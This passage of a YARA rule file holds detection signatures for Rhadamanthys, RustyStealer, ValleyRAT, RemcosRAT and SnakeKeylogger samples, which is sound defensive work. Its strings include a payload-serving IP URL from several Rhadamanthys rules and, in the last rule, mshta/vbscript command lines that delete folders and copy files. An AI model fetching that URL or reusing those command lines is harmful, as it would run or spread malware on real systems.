      $s8 = " kSm x.eU X.Tl A_v.Z_v.y.nal k* TUxN_X_b_N4_q.N8.r_J~_vL.b_SA_bV4" fullword ascii /* score: '11.00'*/
      $s9 = " g.Pw A^.JEm kK~\\_De.V`_HPu.C_R} qiq.0.8.O.W_MvTT.0.8G.M vq_XHj.w- K.h_y.CN_ei.4|-" fullword ascii /* score: '11.00'*/
      $s10 = "_q!.K_N D b.5k.y/S.0_V w Y.Q.BK RCSO** c.h_c-.PeX_Vl y S/;y.U.cw.Wru+_b.cV_w ny_tV_e XM.W#_S_X" fullword ascii /* score: '11.00'*/
      $s11 = "R f_B$.atj:\\C0_b WV_P:.9_b HK_b_X_r3" fullword ascii /* score: '10.00'*/
      $s12 = "t:\\.6 Q.W_e.h.DXp nd.r.f{ J.hH.G hCm!.Y.o.7.f Ai.n(.w_xr_c4.e.2.eU j.j k_E&&_J>-q." fullword ascii /* score: '10.00'*/
      $s13 = "* K.IL_W^;4_W A.T.gB.J.s b.Z ZZd RK.W.M.R Y&{.3^_b m.z.V_Q_V_u a" fullword ascii /* score: '9.00'*/
      $s14 = " S TiRC.8.X_c:_D_l_QR= p A@.w.rT_km_A" fullword ascii /* score: '9.00'*/
      $s15 = "}.u.4{.zqj.H_b r;_k K_W_X D.R T f.x.5.g TM r_R.o.2 C L u I S.6 k,_nr.O9.d_I.M h6_P_v.SpY" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Rhadamanthys_signature__7ccdf26f81c5c13d798e8a7ffab09084_imphash__8b96d741 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_7ccdf26f81c5c13d798e8a7ffab09084(imphash)_8b96d741.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b96d7418b5d6cc0169711e903229636f8640038b6abd6bfdfdba69021cea767"
   strings:
      $s1 = "AhmNYP -s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RustyStealer_signature__28f0a0cfb357fe553e933bf84f98aca7_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_28f0a0cfb357fe553e933bf84f98aca7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3446c814aea4dc67cddefe0629d90a89fce9f754093561ab47aa3e32db3be63c"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s3 = "www.microsoft.com0" fullword ascii /* score: '14.00'*/
      $s4 = " %%%%%%" fullword ascii /* reversed goodware string '%%%%%% ' */ /* score: '11.00'*/
      $s5 = "$%%%%%" fullword ascii /* reversed goodware string '%%%%%$' */ /* score: '11.00'*/
      $s6 = "*****$" fullword ascii /* reversed goodware string '$*****' */ /* score: '11.00'*/
      $s7 = "EyEYz?" fullword ascii /* score: '9.00'*/
      $s8 = "bbbbbbbo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule RustyStealer_signature__28f0a0cfb357fe553e933bf84f98aca7_imphash__a42f37df {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_28f0a0cfb357fe553e933bf84f98aca7(imphash)_a42f37df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a42f37df47fdbb173c7495e18128b693b087e9a3a9a2707ad7cdf18e8c2649a1"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s3 = "www.microsoft.com0" fullword ascii /* score: '14.00'*/
      $s4 = "NZTH.dGv" fullword ascii /* score: '10.00'*/
      $s5 = "6)B|{'^$>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule ValleyRAT_signature__9f3488a2b5c66296a76a1fadde7044c6_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_9f3488a2b5c66296a76a1fadde7044c6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1babe1d289fa4d264663d9a25b10f3183f43d314cae3562a60513e1680017896"
   strings:
      $s1 = "         <requestedExecutionLevel level='requireAdministrator' uiAccess='false'/>" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3bba74cfd49abd4c1f7049d22755e831629c4921490cac52f2bf51da40135f84"
   strings:
      $s1 = "http://185.238.191.89:5554/8ee410fee01a444995e04d84d8c7f931_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s3 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__3f937a77 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_3f937a77.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3f937a7720a54b3ad3bc117f7d2e3263ed0ac02a4b599068daeba19e1752c239"
   strings:
      $s1 = "http://185.238.191.89:5554/13bd6e1841f64129bd09508e978d918c_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s3 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__8564679e {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_8564679e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8564679e9d6496c632214d21c8f3357936f5f5fa47226d6f770ad6889bdaf27b"
   strings:
      $s1 = "http://185.238.191.89:5554/06e45dfe762042d69e25b91371200293_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s3 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1400501f {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1400501f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1400501f3ddee860812351230decc4734e48e809b460894f4cf34d153e65b015"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s3 = "Oqmnczbkx.exe" fullword wide /* score: '22.00'*/
      $s4 = "DOqmnczbkx, Version=1.0.4688.67, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s6 = "\\{\\59\\" fullword ascii /* score: '10.00'*/ /* hex encoded string 'Y' */
      $s7 = ".NET Framework 4.6l" fullword ascii /* score: '10.00'*/
      $s8 = "* Pj[`" fullword ascii /* score: '9.00'*/
      $s9 = "EtFTp\\B" fullword ascii /* score: '9.00'*/
      $s10 = "~(|\\_/$:~3d" fullword ascii /* score: '9.00'*/ /* hex encoded string '=' */
      $s11 = "fefeffeeffe" ascii /* score: '8.00'*/
      $s12 = "fefeffefefe" ascii /* score: '8.00'*/
      $s13 = "affefeeffe" ascii /* score: '8.00'*/
      $s14 = "fefeffeefa" ascii /* score: '8.00'*/
      $s15 = "affefefeeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__366021eb {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_366021eb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "366021ebe0e04258caa4cc6ce5620021b3da7c0fbdc642a0f7631a556d7f3630"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s3 = "<re-60, Version=5.5.3.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s4 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s5 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s6 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s7 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s8 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
      $s9 = "re-60.exe" fullword wide /* score: '16.00'*/
      $s10 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s11 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii /* score: '13.00'*/
      $s12 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii /* score: '13.00'*/
      $s13 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
      $s14 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii /* score: '13.00'*/
      $s15 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__fb51ede541a9ad63bf23d302e319d2a0_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_fb51ede541a9ad63bf23d302e319d2a0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2c0cfe1cf39f794b0097fe3257b9615a52207910557b76dec822f5540463574"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule ValleyRAT_signature__fb51ede541a9ad63bf23d302e319d2a0_imphash__acef4ddd {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_fb51ede541a9ad63bf23d302e319d2a0(imphash)_acef4ddd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "acef4dddd9c38e517b707ad8d3777df9e4a3849b78206308ddeca84facae49e3"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule ValleyRAT_signature__fb51ede541a9ad63bf23d302e319d2a0_imphash__db53b8fa {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_fb51ede541a9ad63bf23d302e319d2a0(imphash)_db53b8fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db53b8facfc960e2654dd0d69f34f9a8c8f2d4344addde1d41cf3f84ef83dc5a"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "ihziepulgned" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2bd14b96 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2bd14b96.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2bd14b966dec6792a03cd2925460702e0a83da7d3d4b3461eac8f01c78cc1326"
   strings:
      $s1 = "IAcU.exe" fullword wide /* score: '22.00'*/
      $s2 = "IAcU.pdb" fullword ascii /* score: '14.00'*/
      $s3 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s4 = "PatternGenerator.Forms.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s5 = "Error exporting pattern: " fullword wide /* score: '10.00'*/
      $s6 = "GetImageFormat" fullword ascii /* score: '9.00'*/
      $s7 = "GetQualityValue" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2f76a219 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f76a219.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2f76a21937582bd59783cab01437d029a6ccd52635e2a3f424831ad7e444e640"
   strings:
      $s1 = "KmVz.exe" fullword wide /* score: '22.00'*/
      $s2 = "KmVz.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Yyg9RWdwK" fullword ascii /* base64 encoded string 'c(=Egp' */ /* score: '11.00'*/
      $s4 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s5 = "PatternGenerator.Forms.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s6 = "Error exporting pattern: " fullword wide /* score: '10.00'*/
      $s7 = "GetImageFormat" fullword ascii /* score: '9.00'*/
      $s8 = "GetQualityValue" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__21371b611d91188d602926b15db6bd48_imphash__b2437acd {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_21371b611d91188d602926b15db6bd48(imphash)_b2437acd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b2437acd794a51d547eddf50d42a6eabf2f90b49fef333eae84332c873f5efb3"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "daa3ae9f7d210ac7f61ec03bdc3955c098f8902ed353577752b747de107933ee"
   strings:
      $s1 = "TencentdBxmgTNZ.exe" fullword wide /* score: '22.00'*/
      $s2 = "RSJLRSJOMSJ" fullword ascii /* base64 encoded string 'E"KE"N1"' */ /* score: '16.50'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s4 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s5 = "7777777777777.A@$77" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wwwwwwzw' */
      $s6 = "denglupeizhi" fullword ascii /* score: '8.00'*/
      $s7 = "aaaaadddddddddd" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash__3f61f262 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash)_3f61f262.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3f61f2626ae164481484e1145ab87bf220e38f7dfd425fd3e533f03803a44189"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s3 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash__8ff7bf8d {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash)_8ff7bf8d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8ff7bf8dfda2d9edd97a9793a4cc24970b7ddb6661e545b159dbdaaccd029299"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s3 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash__b34998b5 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash)_b34998b5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b34998b5835cd4ae700f598e1f6f04de187b7961c70d6ab0bcb739e445511664"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s3 = "denglupeizhi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__2 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b02256544a6763f6abe0c6a7f6bc5bcd155252fa3936659a806b69ff3157f2ba"
   strings:
      $s1 = "Launcher.exe" fullword ascii /* score: '22.00'*/
      $s2 = "\\\",\\58" fullword ascii /* score: '10.00'*/ /* hex encoded string 'X' */
      $s3 = "~,}2}4}<}" fullword ascii /* score: '9.00'*/ /* hex encoded string '$' */
      $s4 = "3#\"\"\\f" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s5 = "* E-)j" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 12000KB and
      all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1b35dcf34e3ad95f8148543349418a51fa31eaa37a807d9d2ddedd56a54bfd57"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s6 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s7 = "OvZPs -vHG" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__a653b194 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_a653b194.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a653b19403d6a9f814130e4ca97194b9eade03575239d07bf00a225c9d012961"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "Harbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic" ascii /* score: '12.00'*/
      $s6 = "ogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor" ascii /* score: '12.00'*/
      $s7 = "es air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistic" ascii /* score: '12.00'*/
      $s8 = "or Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic Sky" ascii /* score: '12.00'*/
      $s9 = "c SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems Sky" ascii /* score: '12.00'*/
      $s10 = " Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages" ascii /* score: '12.00'*/
      $s11 = " SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air tra" ascii /* score: '12.00'*/
      $s12 = "ics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Mana" ascii /* score: '12.00'*/
      $s13 = "affic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems" ascii /* score: '12.00'*/
      $s14 = "SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traf" ascii /* score: '12.00'*/
      $s15 = "tems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air traffic SkyLogistics Systems SkyHarbor Manages air" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__cd00e968 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_cd00e968.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd00e9684bb6a8b2b5ea0699b89cb251221c343cfb6ab3f6ec57525b349fc25f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "JOAK:\"r" fullword ascii /* score: '10.00'*/
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s7 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s8 = "GQcbvgUBSpy" fullword ascii /* score: '9.00'*/
      $s9 = "a5, -kf+ " fullword ascii /* score: '9.00'*/
      $s10 = "*  wCS" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d83fe25c47771ebd5932b0e4f7826176f460d37de660452d8f1472b31576593"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "\\\",\\58" fullword ascii /* score: '10.00'*/ /* hex encoded string 'X' */
      $s6 = "~,}2}4}<}" fullword ascii /* score: '9.00'*/ /* hex encoded string '$' */
      $s7 = "* E-)j" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule RustyStealer_signature__2 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed797beb927738d68378cd718ea0dc74e605df0e66bd5670f557217720fb2871"
   strings:
      $x1 = "NameTableTypeColumnIdentifier_ValidationValueNPropertyId_SummaryInformationDescriptionSetCategoryKeyTableMaxValueNullableKeyColu" ascii /* score: '69.00'*/
      $x2 = "ForceDeleteFolderTARGETDIRmshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd /c rmdir /s /q \"\"[INSTALLDIR]\"\"\",0,true)" ascii /* score: '36.00'*/
      $x3 = "&dt record.ComponentIdGuidA string GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Dir" ascii /* score: '35.00'*/
      $x4 = "reateObject(\"WScript.Shell\").Run(\"cmd /c if exist \"\"[LocalAppDataFolder]LOG\"\" copy /Y \"\"[LocalAppDataFolder]LOG\"\" \"" ascii /* score: '34.00'*/
      $x5 = "alAppDataFolder]av.dat\"\"\",0,true)(window.close)RestoreAndDeleteFile3mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd " ascii /* score: '34.00'*/
      $x6 = ".Run(\"cmd /c if exist \"\"[LocalAppDataFolder]av.dat\"\" copy /Y \"\"[LocalAppDataFolder]av.dat\"\" \"\"[INSTALLDIR]av.dat\"\" " ascii /* score: '33.00'*/
